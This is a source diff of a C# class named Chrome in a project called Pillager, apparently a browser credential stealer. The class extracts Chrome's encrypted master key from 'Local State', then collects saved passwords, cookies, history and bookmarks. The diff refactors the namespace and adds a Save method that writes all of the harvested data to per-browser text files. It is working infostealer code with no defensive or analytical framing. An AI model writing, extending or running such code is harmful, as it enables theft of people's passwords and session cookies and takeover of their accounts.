@@ -1,11 +1,11 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
+using Pillager.Helper;
 
-namespace Pillager
+namespace Pillager.Browsers
 {
     public class Chrome
     {
@@ -26,7 +26,7 @@ namespace Pillager
         {
             string filePath = Path.Combine(Directory.GetParent(BrowserPath).FullName, "Local State");
             byte[] masterKey = new byte[] { };
-            if (File.Exists(filePath) == false)
+            if (!File.Exists(filePath))
                 return null;
             var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));
             foreach (System.Text.RegularExpressions.Match prof in pattern)
@@ -71,7 +71,7 @@ namespace Pillager
             return decryptedData;
         }
 
-        internal string Chrome_passwords()
+        public string Chrome_passwords()
         {
             StringBuilder passwords = new StringBuilder();
             string loginDataPath = Path.Combine(BrowserPath, "Login Data");
@@ -141,8 +141,6 @@ namespace Pillager
             return history.ToString(); ;
         }
 
-
-
         public string Chrome_cookies()
         {
             StringBuilder cookies = new StringBuilder();
@@ -177,7 +175,6 @@ namespace Pillager
             return cookies.ToString();
         }
 
-
         public string Chrome_books()
         {
             StringBuilder stringBuilder = new StringBuilder();
@@ -187,6 +184,24 @@ namespace Pillager
                 stringBuilder.Append(File.ReadAllText(chrome_book_path));
             }
             return stringBuilder.ToString();
+        }
+
+        public void Save(string path)
+        {
+            if (MasterKey==null)
+            {
+                return;
+            }
+            string savepath = Path.Combine(path, BrowserName);
+            Directory.CreateDirectory(savepath);
+            string cookies = Chrome_cookies();
+            string passwords = Chrome_passwords();
+            string books = Chrome_books();
+            string history = Chrome_history();
+            File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
+            File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
+            File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
+            File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
         }
     }
 }
